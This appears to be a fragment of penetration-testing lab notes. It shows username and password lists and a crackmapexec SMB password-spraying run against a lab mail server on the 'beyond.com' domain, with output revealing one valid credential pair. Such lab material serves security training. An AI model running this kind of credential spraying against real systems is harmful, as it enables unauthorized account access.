
```
kali@kali:~/beyond$ cat usernames.txt                                         
marcus
john
daniela

kali@kali:~/beyond$ cat passwords.txt
tequieromucho
DanielKeyboard3311
dqsTwTpZPn#nL
```


```
kali@kali:~/beyond$ crackmapexec smb 192.168.50.242 -u usernames.txt -p passwords.txt --continue-on-success
SMB         192.168.50.242  445    MAILSRV1         [*] Windows 10.0 Build 20348 x64 (name:MAILSRV1) (domain:beyond.com) (signing:False) (SMBv1:False)
SMB         192.168.50.242  445    MAILSRV1         [-] beyond.com\marcus:tequieromucho STATUS_LOGON_FAILURE 
SMB         192.168.50.242  445    MAILSRV1         [-] beyond.com\marcus:DanielKeyboard3311 STATUS_LOGON_FAILURE 
SMB         192.168.50.242  445    MAILSRV1         [-] beyond.com\marcus:dqsTwTpZPn#nL STATUS_LOGON_FAILURE 
SMB         192.168.50.242  445    MAILSRV1         [-] beyond.com\john:tequieromucho STATUS_LOGON_FAILURE 
SMB         192.168.50.242  445    MAILSRV1         [-] beyond.com\john:DanielKeyboard3311 STATUS_LOGON_FAILURE 
SMB         192.168.50.242  445    MAILSRV1         [+] beyond.com\john:dqsTwTpZPn#nL
SMB         192.168.50.242  445    MAILSRV1         [-] beyond.com\daniela:tequieromucho STATUS_LOGON_FAILURE 
SMB         192.168.50.242  445    MAILSRV1         [-] beyond.com\daniela:DanielKeyboard3311 STATUS_LOGON_FAILURE 
SMB         192.168.50.242  445    MAILSRV1         [-] beyond.com\daniela:dqsTwTpZPn#nL STATUS_LOGON_FAILURE 
```
==SMB         192.168.50.242  445    MAILSRV1         [+] beyond.com\\john:dqsTwTpZPn#nL==

